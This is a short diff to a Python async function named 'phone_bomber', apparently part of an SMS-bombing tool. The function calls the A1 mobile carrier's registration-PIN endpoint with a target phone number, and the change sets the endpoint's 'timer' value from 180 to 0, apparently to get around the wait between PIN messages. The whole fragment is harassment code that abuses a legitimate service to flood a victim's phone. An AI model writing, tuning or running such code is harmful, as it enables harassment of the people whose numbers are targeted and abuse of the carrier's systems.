@@ -71,7 +71,7 @@ async def phone_bomber(phone):
         phone_a1 = parse_phone_a1(phone)
         try:
             feature_a1 = loop.run_in_executor(None, lambda: requests.request("GET",
-                                                                             url=f'https://asmp.a1.by/asmp/registration-sendpin?t=r&phone={phone_a1}&timer=180',
+                                                                             url=f'https://asmp.a1.by/asmp/registration-sendpin?t=r&phone={phone_a1}&timer=0',
                                                                              headers=a1_headers, data={}))
             response_a1 = await feature_a1
             output_status(response_a1, "A1")
